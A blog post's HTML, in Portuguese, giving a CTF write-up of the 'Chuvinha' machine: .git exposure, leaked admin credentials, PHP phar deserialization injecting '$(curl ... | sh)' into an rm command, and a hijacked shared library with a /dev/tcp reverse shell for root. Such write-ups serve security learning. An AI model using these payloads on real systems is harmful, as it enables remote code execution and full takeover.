@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>UHCCTF (Classificatória) - Chuvinha | big0us</title>
+<meta name="generator" content="Jekyll v4.2.1" />
+<meta property="og:title" content="UHCCTF (Classificatória) - Chuvinha" />
+<meta name="author" content="Vinicius Pereira" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
+<meta property="og:description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
+<meta property="og:site_name" content="big0us" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-09-13T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="UHCCTF (Classificatória) - Chuvinha" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Vinicius Pereira"},"description":"Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.","headline":"UHCCTF (Classificatória) - Chuvinha","dateModified":"2020-09-13T00:00:00+00:00","url":"/2020/09/13/uhc-chuvinha.html","datePublished":"2020-09-13T00:00:00+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2020/09/13/uhc-chuvinha.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="big0us" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">big0us<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/big0x75"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="https://linkedin.com/in/viniciuspereiras"><i class="fab fa-linkedin"></i></a>
+        
+        
+        
+        <a class="color-pink-hover" href="https://github.com/viniciuspereiras"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    /assets/avatar.gif
+" class="author-avatar" alt="Avatar" />
+<div class="description">Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">UHCCTF (Classificatória) - Chuvinha</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/pt-br/">pt-br</a>
+      
+      <a class="tag" href="/tag/ctf/">ctf</a>
+      
+      <a class="tag" href="/tag/write-up/">write-up</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 13 Sep 2020</div>
+  
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-72MZ89K41P"></script>
+
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-72MZ89K41P');
+</script>
+
+<h1 id="recon">Recon</h1>
+
+<p>(Não usei o nmap pois abri a máquina no meu computador, o nmap não apontaria nada demais se eu rodasse ele no UHCLabs ou no próprio dia do UHC)</p>
+
+<p><img src="/assets/chuvinha/Untitled.png" alt="/assets/chuvinha/Untitled.png" /></p>
+
+<p>De início o site é um blog sobre hacking e possui alguns lugares para compra de cursos, incluindo ZAP LOCKING (trava zap)…</p>
+
+<p>Dando uma olhada no site em busca de falhas e também no código fonte, a primeira coisa que eu tentei “explorar” foi um formulário de e-mail no final da página, em busca de alguns Comand Injections, Server-side Request Forgery e etc.</p>
+
+<p><img src="/assets/chuvinha/Untitled%201.png" alt="/assets/chuvinha/Untitled%201.png" /></p>
+
+<p>Porém não encontrei nada.</p>
+
+<p>Então segui e rodei um Fuzzing em busca de arquivos e diretórios no site, utilizei uma ferramenta chamada “ffuf”:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> <span class="s1">'http://127.0.0.1/FUZZ'</span> <span class="nt">-c</span>
+</code></pre></div></div>
+
+<p><img src="/assets/chuvinha/Untitled%202.png" alt="/assets/chuvinha/Untitled%202.png" /></p>
+
+<p>Como está no comando acima eu utilizei a wordlist “common.txt” do repositório seclists no github. De início houve alguns retornos interessantes, eu poderia rodar outras wordlists, normalmente eu uso a “common.txt, quickhits.txt e big.txt”.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LICENSE                - Apenas uma licensa de código, muito comum em ctfs;
+admin.php              - Painel de administração, vamos voltar nele mais tarde;
+.hta                   - Arquivos do apache, status code 403 acesso negado!
+css                    - Pasta de arquivos do CSS, acesso negado!
+.git/HEAD              - ".git" exposed uma vulnerabilidade crítica;
+font                   - Arquivo de fontes, acesso negado!
+fonts                  - Arquivo de fontes, acesso negado!
+img                    - Uma pasta com as imagens do site, acesso negado!
+index.html             - Página incial do site;
+.htaccess              - Arquivos do apache, status code 403 acesso negado!
+js                     - Arquivos de javascript, acesso negado!
+.htpasswd              - Arquivos do apache, status code 403 acesso negado!
+server-status          - Script que verifica se o servidor está online, porém, status code 403 acesso negado!
+uploads                - Pasta de uploads, interessante... mas acesso negado.
+</code></pre></div></div>
+
+<p>Na página /admin.php temos um redirect para /login.php onde existe formulário de login, podemos verificar se existe alguma forma de achar credenciais e fazer o login ou fazer algum tipo de bypass.</p>
+
+<p><img src="/assets/chuvinha/Untitled%203.png" alt="/assets/chuvinha/Untitled%203.png" /></p>
+
+<p>Na página /.git parece que temos uma possível falha de “git exposed”, vamos verificar se é válida e se sim vamos explora-la.</p>
+
+<p>(Ao invés de entrar no “/.git/HEAD”  verifiquei o “.git”:</p>
+
+<p><img src="/assets/chuvinha/Untitled%204.png" alt="/assets/chuvinha/Untitled%204.png" /></p>
+
+<p>Temos uma página dizendo que não podemos acessar o .git, esse template é incomum de ver em páginas com .git exposto, ai deve ter algo, dando um Ctrl+U para verificar o código fonte da página acabei encontrando a primeira flag! (sempre é bom ler o código fonte das aplicações).</p>
+
+<p><img src="/assets/chuvinha/Untitled%205.png" alt="/assets/chuvinha/Untitled%205.png" /></p>
+
+<p>Agora as chances da exploração serem pela falha de git exposed aumentaram pelo fato da primeira flag estar lá.</p>
+
+<p>Se o desenvolvedor utiliza o Git para controle de versões do site, lá ficariam localizados todos os arquivos do site, commits (pequenas notas sobre o que mudou de versão para versão) e etc, o /.git não deveria ser acessível pelo público.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="parte-1">Parte 1</h2>
+
+<p>Para explorar o Git Exposed existem duas formas, de forma manual, e usando algumas tools. Eu recomendo tentar fazer de forma manual, e depois rodar a Tool, para aprender o que realmente a Tool faz. Vou deixar um link onde existe um artigo sobre falha de Git Exposed e sobre como explorar de forma manual (<a href="https://medium.com/swlh/hacking-git-directories-e0e60fa79a36">https://medium.com/swlh/hacking-git-directories-e0e60fa79a36</a>).</p>
+
+<p>Como disse acima vamos usar algumas ferramentas para essa exploração, no caso elas estão em um repositório do GitHub que tem o nome de GitTools (<a href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a>)</p>
+
+<p>Na verdade é um pacote com 3 scripts, vamos usar dois deles, o Dumper e o Extractor.</p>
+
+<p>Primeiro o Dumper para dumpar as coisas que estão no Git da máquina. (o segundo argumento é a pasta para onde os arquivos vão, botei na pasta onde está o script de extrair os arquivos para facilitar).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./gitdumper.sh <span class="s1">'http://127.0.0.1/.git/'</span> ~/Tools/GitTools/Extractor/dumpchuvinha
+</code></pre></div></div>
+
+<p><img src="/assets/chuvinha/Untitled%206.png" alt="/assets/chuvinha/Untitled%206.png" /></p>
+
+<p>Agora vamos para o diretório do Extractor e vamos extrair esse dump de arquivos para podermos ler:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./extractor.sh dumpchuvinha extractchuvinha
+</code></pre></div></div>
+
+<p><img src="/assets/chuvinha/Untitled%207.png" alt="/assets/chuvinha/Untitled%207.png" /></p>
+
+<p>Agora temos todos os arquivos do site na nossa maquina!</p>
+
+<p>E parece que tem uma flag aqui hehe:</p>
+
+<p><img src="/assets/chuvinha/Untitled%208.png" alt="/assets/chuvinha/Untitled%208.png" /></p>
+
+<p>Parece que teremos que fazer um code review…</p>
+
+<p>Vou abrir tudo no VisualStudioCode para facilitar.</p>
+
+<p>Na primeira versão do site (/0-be7dbd2b1e15ffec896cf61484c5a89d18b77335) temos um arquivo de log do apache para ler.</p>
+
+<p><img src="/assets/chuvinha/Untitled%209.png" alt="/assets/chuvinha/Untitled%209.png" /></p>
+
+<p>São várias solicitações GET para o site que não aparentam ter nada de interessante, são tantas iguais o que me da a ideia de procurar por algo diferente em meio a todas essas iguais, dando um Ctrl+F para pesquisar dentro do arquivo, eu procuro por “POST” um outro método http, e incrivelmente eu encontro um request POST de uma autenticação, com credenciais para a página login.php, na fase de reconhecimento identificamos a página admin.php, muito provavelmente essas credenciais são do administrador do site.</p>
+
+<p><img src="/assets/chuvinha/Untitled%2010.png" alt="/assets/chuvinha/Untitled%2010.png" /></p>
+
+<p>Como é um request php parece que a senha está encodada em string de URL, vou utilizar um decoder de URL para arrumar isso.</p>
+
+<p><img src="/assets/chuvinha/Untitled%2011.png" alt="/assets/chuvinha/Untitled%2011.png" /></p>
+
+<p>Ok, vamos testar essas credenciais!</p>
+
+<p><img src="/assets/chuvinha/Untitled%2012.png" alt="/assets/chuvinha/Untitled%2012.png" /></p>
+
+<p>Logamos!</p>
+
+<p>(Um aviso: Agora a exploração será um pouco complicada, não prometo que vai ser o melhor jeito de explicar porém darei o meu melhor)</p>
+
+<p>Nessa página temos um lugar para colocar uma URL de imagem e um campo que checa o tamanho da imagem (Arquivo).</p>
+
+<p>Tentei colocar alguns arquivos para tentar upar alguma shell, mas não tive resultados.</p>
+
+<p>Vamos retornar para o código que dumpamos para entender melhor como que isso funciona:</p>
+
+<p><img src="/assets/chuvinha/Untitled%2013.png" alt="/assets/chuvinha/Untitled%2013.png" /></p>
+
+<p>Nós passamos um link e o php executa um wget para esse link pegando o arquivo e salvando (por conta da função escapeshellarg() nós não conseguiremos manipular o input para trigar um RCE), mas existem outras formas…</p>
+
+<p>Depois ele roda um filesize() no arquivo e retorna o outupt na página.</p>
+
+<p>Um adendo a uma parte do código curiosa no começo dele:</p>
+
+<p><img src="/assets/chuvinha/Untitled%2014.png" alt="/assets/chuvinha/Untitled%2014.png" /></p>
+
+<p>Parece que temos uma função que remove algo do servidor com o comando “rm”, no caso o $package_name, será que tem alguma forma de modificar esse objeto $package_name para algo que escapasse do comando “rm” e nós conseguíssemos rodar comandos no servidor?</p>
+
+<p>Dando uma pesquisada pelas funções que tem no código ( filesize() e __destruct() ) acabei descobrindo uma forma de desserealização insegura com arquivos phar.</p>
+
+<h1 id="exploitation-1">Exploitation</h1>
+<h2 id="parte-2">Parte 2</h2>
+
+<p>O objetivo de um ataque de desserealização insegura em uma aplicação web é poder manipular/injetar objetos, e é o que temos que fazer com o objeto $packagename para conseguir um RCE.</p>
+
+<p>Vamos utilizar arquivos phar que são gerados com a classe Phar que é utilizada para empacotar aplicações PHP em um único arquivo que pode ser facilmente distribuído e executado. Se ficou complicado explicarei melhor, pense em um arquivo zip com varias coisas dentro, esse é o arquivo phar no php porém com vários objetos e classes dentro.</p>
+
+<p>A sacada é que existem algumas funções no php que quando executadas em arquivos phar desserealizam os objetos dele, uma dessas funções é a filesize(), então o que temos que fazer é instanciar a classe Package onde está a parte vulnerável da aplicação e declarar o nosso $package_name com o nosso payload.</p>
+
+<p>Como na outra parte da exploração vou deixar alguns links de artigos e em especial um vídeo do ippsec (que inclusive narra o UHC em algumas edições).</p>
+
+<p>Artigos:</p>
+<ul>
+  <li><a href="https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/">https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/</a></li>
+  <li><a href="https://www.youtube.com/watch?v=fHZKSCMWqF4">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a></li>
+</ul>
+
+<p>Vídeos:</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=fHZKSCMWqF4">https://www.youtube.com/watch?v=fHZKSCMWqF4</a></li>
+</ul>
+
+<p>Ok, vamos começar a brincadeira!</p>
+
+<p>Para gerar o arquivo phar vou utilizar um script pronto do PayloadAllTheThings:</p>
+
+<p>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md#php-phar-deserialization">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure Deserialization/PHP.md#php-phar-deserialization</a>)</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">PDFGenerator</span> <span class="p">{</span> <span class="p">}</span>
+
+<span class="c1">//Create a new instance of the Dummy class and modify its property</span>
+<span class="nv">$dummy</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDFGenerator</span><span class="p">();</span>
+<span class="nv">$dummy</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="s2">"passthru"</span><span class="p">;</span>
+<span class="nv">$dummy</span><span class="o">-&gt;</span><span class="n">fileName</span> <span class="o">=</span> <span class="s2">"uname -a &gt; pwned"</span><span class="p">;</span> <span class="c1">//our payload</span>
+
+<span class="c1">// Delete any existing PHAR archive with that name</span>
+<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">"poc.phar"</span><span class="p">);</span>
+
+<span class="c1">// Create a new archive</span>
+<span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Phar</span><span class="p">(</span><span class="s2">"poc.phar"</span><span class="p">);</span>
+
+<span class="c1">// Add all write operations to a buffer, without modifying the archive on disk</span>
+<span class="nv">$poc</span><span class="o">-&gt;</span><span class="nf">startBuffering</span><span class="p">();</span>
+
+<span class="c1">// Set the stub</span>
+<span class="nv">$poc</span><span class="o">-&gt;</span><span class="nf">setStub</span><span class="p">(</span><span class="s2">"&lt;?php echo 'Here is the STUB!'; __HALT_COMPILER();"</span><span class="p">);</span>
+
+<span class="cm">/* Add a new file in the archive with "text" as its content*/</span>
+<span class="nv">$poc</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"text"</span><span class="p">;</span>
+<span class="c1">// Add the dummy object to the metadata. This will be serialized</span>
+<span class="nv">$poc</span><span class="o">-&gt;</span><span class="nf">setMetadata</span><span class="p">(</span><span class="nv">$dummy</span><span class="p">);</span>
+<span class="c1">// Stop buffering and write changes to disk</span>
+<span class="nv">$poc</span><span class="o">-&gt;</span><span class="nf">stopBuffering</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Agora vamos começar alterando o nome da classe “PDFGenerator” para o nome da nossa classe vulnerável.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PDFGenerator —&gt; Package
+</code></pre></div></div>
+
+<p>Depois o objeto “filename” para o nome do nosso objeto onde temos que escrever o payload</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filename —&gt; package_name
+</code></pre></div></div>
+
+<p>E então temos que escrever a nossa payload, como o comando que vai rodar é um “rm” teremos que escapar dele:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm payload
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Existem várias formas de se fazer isso(</td>
+      <td>, ; ) irei fazer com $(), o comando rodaria mais ou menos assim no servidor:</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm $(payload)
+</code></pre></div></div>
+
+<p>Assim estaríamos escapando do “rm” e podendo escrever o que quiséssemos de comando no lugar de payload.</p>
+
+<p>O script terá que ficar mais ou menos assim:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">Package</span> <span class="p">{</span> <span class="p">}</span>
+
+<span class="c1">//Create a new instance of the Dummy class and modify its property</span>
+<span class="nv">$dummy</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Package</span><span class="p">();</span>
+<span class="c1">//$dummy-&gt;callback = "passthru";</span>
+<span class="nv">$dummy</span><span class="o">-&gt;</span><span class="n">package_name</span> <span class="o">=</span> <span class="s2">"$(curl http://reverse-shell.sh/172.31.228.136:1234 | sh ) "</span><span class="p">;</span> <span class="c1">//our payload</span>
+
+<span class="c1">// Delete any existing PHAR archive with that name</span>
+<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">"poc.phar"</span><span class="p">);</span>
+
+<span class="c1">// Create a new archive</span>
+<span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Phar</span><span class="p">(</span><span class="s2">"poc.phar"</span><span class="p">);</span>
+
+<span class="c1">// Add all write operations to a buffer, without modifying the archive on disk</span>
+<span class="nv">$poc</span><span class="o">-&gt;</span><span class="nf">startBuffering</span><span class="p">();</span>
+
+<span class="c1">// Set the stub</span>
+<span class="nv">$poc</span><span class="o">-&gt;</span><span class="nf">setStub</span><span class="p">(</span><span class="s2">"&lt;?php echo 'Here is the STUB!'; __HALT_COMPILER();"</span><span class="p">);</span>
+
+<span class="cm">/* Add a new file in the archive with "text" as its content*/</span>
+<span class="nv">$poc</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"text"</span><span class="p">;</span>
+<span class="c1">// Add the dummy object to the metadata. This will be serialized</span>
+<span class="nv">$poc</span><span class="o">-&gt;</span><span class="nf">setMetadata</span><span class="p">(</span><span class="nv">$dummy</span><span class="p">);</span>
+<span class="c1">// Stop buffering and write changes to disk</span>
+<span class="nv">$poc</span><span class="o">-&gt;</span><span class="nf">stopBuffering</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Minha payload foi uma forma bem legal de pegar reverse shell, usando um site, logo depois passei meu ip e a porta onde ele deve se conectar.</p>
+
+<p>Agora vamos gerar o arquivo phar!</p>
+
+<p><img src="/assets/chuvinha/Untitled%2015.png" alt="/assets/chuvinha/Untitled%2015.png" /></p>
+
+<p>Parece que nossa configuração do php não nos deixa gerar um arquivo phar, vamos arrumar isso.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">--</span><span class="n">ini</span>
+</code></pre></div></div>
+
+<p>Isso vai retornar onde está seu arquivo de configuração do php, vamos editar ele, procurando por “phar” vamos modificar uma linha: (removendo o ; do começo dela e escrevendo “Off” no lugar de  “On”)</p>
+
+<p><img src="/assets/chuvinha/Untitled%2016.png" alt="/assets/chuvinha/Untitled%2016.png" /></p>
+
+<p>E então:</p>
+
+<p><img src="/assets/chuvinha/Untitled%2017.png" alt="/assets/chuvinha/Untitled%2017.png" /></p>
+
+<p>Agora deve funcionar:</p>
+
+<p><img src="/assets/chuvinha/Untitled%2018.png" alt="/assets/chuvinha/Untitled%2018.png" /></p>
+
+<p>Temos nosso payload. Para fazer o donwload dele na máquina vou criar um servidor python na minha maquina:</p>
+
+<p>(<a href="https://github.com/viniciuspereiras/bingo">https://github.com/viniciuspereiras/bingo</a>)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bingo 
+</code></pre></div></div>
+
+<p>ou</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 
+</code></pre></div></div>
+
+<p>E o download:</p>
+
+<p><img src="/assets/chuvinha/Untitled%2019.png" alt="/assets/chuvinha/Untitled%2019.png" /></p>
+
+<p>Ok retornou com um “File downloaded! You can access it Here” vou clicar no Here para ver o caminho onde o arquivo foi salvo.</p>
+
+<p><img src="/assets/chuvinha/Untitled%2020.png" alt="/assets/chuvinha/Untitled%2020.png" /></p>
+
+<p>Agora vamos rodar a função do filesize() nele mas usando um “phar://./” antes para funcionar, e também abriremos um netcat para ouvir na porta onde colocamos (no caso na porta 1234)</p>
+
+<p><img src="/assets/chuvinha/Untitled%2021.png" alt="/assets/chuvinha/Untitled%2021.png" /></p>
+
+<p>Aqui está nossa shell, para ela ficar mais interativa usei o “rlwrap” antes do netcat.</p>
+
+<h1 id="pós-exploitation">Pós-Exploitation</h1>
+
+<p>Agora que estamos com shell precisamos escalar nossos privilégios na máquina, estamos como o usuário do apache “www-data”.</p>
+
+<p>Verifiquei os diretórios atrás de coisas, verifiquei as permissões de sudo (aparentemente não podemos rodar sudo na máquina), e verifiquei as permissões de binários também, e no fim rodei um linpeas para garantir.</p>
+
+<p>Achei uma pasta de um script na pasta /opt do linux, o script é um monitorador de diretórios git expostos (cômico pois ele falhou lá atrás). E tem cara de que vai falhar agora nos dando uma shell de root.</p>
+
+<p><img src="/assets/chuvinha/Untitled%2022.png" alt="/assets/chuvinha/Untitled%2022.png" /></p>
+
+<p>Lendo o script em c, percebemos que ele é bem simples, e opa achamos mais uma flag!</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include "gitlib/libgitutils.h"
+</span>
+<span class="c1">// UHC{s1mpl3%%%%%%%%%%%%%%t0_RCE}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="n">check_git_safety</span><span class="p">();</span>
+<span class="p">}</span><span class="err">$</span>
+</code></pre></div></div>
+
+<p>Lendo o <a href="http://readme.md">README.md</a> podemos ver como que o script foi instalado e um pouco de como ele funciona.</p>
+
+<p><img src="/assets/chuvinha/Untitled%2023.png" alt="/assets/chuvinha/Untitled%2023.png" /></p>
+
+<p>Podemos perceber que o script utliza uma biblioteca compartilhada, poderiamos trocar a biblioteca que ele está usando para uma biblioteca nossa e subscrever  a função que o script usa, no caso “check_git_safety()”.</p>
+
+<p>Isto se chama Library Hijacking nesse caso em libs de C.</p>
+
+<p>Pesquisando sobre como criar libs em C cheguei a simples conclusão que só precisamos escrever uma nova função num script “.c” normal e compilar como uma biblioteca.</p>
+
+<p>Então vamos escrever nossa biblioteca falsificada e declarar nossa função:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
+</span><span class="kt">void</span> <span class="nf">check_git_safety</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'bash -i &gt;&amp; /dev/tcp/172.20.17.36/8989 0&gt;&amp;1'"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Como pode ver subscrevi a função check_git_safety() para rodar a função system com o comando para nos mandar uma reverse shell.</p>
+
+<p>Ela iria mandar a shell como root já que no <a href="http://readme.md">README.md</a> percebemos que o script roda como um cronjob de root.</p>
+
+<p>Então na minha máquina vou compilar o script para transformar numa biblioteca compartilhada.</p>
+
+<p>(O nome do script é libgitutils.c)</p>
+
+<p>Vamos compilar:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc libgitutils.c <span class="nt">-fpic</span> <span class="nt">-c</span>
+</code></pre></div></div>
+
+<p>Isso vai gerar um arquivo libgitutils.o</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-shared</span> <span class="nt">-o</span> libgitutils.so libgitutils.o
+</code></pre></div></div>
+
+<p>Agora temos nossa biblioteca compartilhada <a href="http://libgitutils.so">libgitutils.so</a> .</p>
+
+<p>Vamos novamente abrir um servidor python na nossa máquina para passar a biblioteca compartilhada para dentro na máquina que temos shell.</p>
+
+<p><img src="/assets/chuvinha/Untitled%2024.png" alt="/assets/chuvinha/Untitled%2024.png" /></p>
+
+<p>Agora com a nossa biblioteca falsificada dentro da máquina vamos seguir as instruções do <a href="http://readme.md">README.md</a> e copiar nossa lib falsificada para o diretório das instruções.</p>
+
+<p>Primeira instrução:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Copy our libgitutils.so library to /lib/x86_64-linux-gnu/libgitutils.so
+</code></pre></div></div>
+
+<p>Vamos copiar:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp </span>libgitutils.so /lib/x86_64-linux-gnu/libgitutils.so
+</code></pre></div></div>
+
+<p>Segunda instrução:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2. Install a cronjob that runs /opt/git-monitorer/gitmon every minute
+</code></pre></div></div>
+
+<p>Como já alteramos a biblioteca, a cada um minuto o script deve ser rodado, então vamos apenas abrir a porta 8989 da nossa máquina para receber a reverse shell e esperar um minuto.</p>
+
+<p><img src="/assets/chuvinha/Untitled%2025.png" alt="/assets/chuvinha/Untitled%2025.png" /></p>
+
+<p>Ownamos!</p>
+
+<p>Agora vamos ver se achamos a flag, dando uma olhada rápida pelo diretório /root, ela já estava lá.</p>
+
+<p><img src="/assets/chuvinha/Untitled%2026.png" alt="/assets/chuvinha/Untitled%2026.png" /></p>
+
+<p>É isso XD .</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2021/10/07/latinoware2021-planilhasbaby.html">
+            CTF LatinoWare 2021 - Planilhas Baby
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/06/04/uhc-cap.html">
+            UHCCTF (Classificatória) - Cap
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/06/03/uhc-storm.html">
+            UHCCTF (Classificatória) - Storm
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/eng/" class="set-1">eng</a> <a href="/tag/latinoware/" class="set-1">latinoware</a> <a href="/tag/pt-br/" class="set-5">pt-br</a> <a href="/tag/write-up/" class="set-5">write-up</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
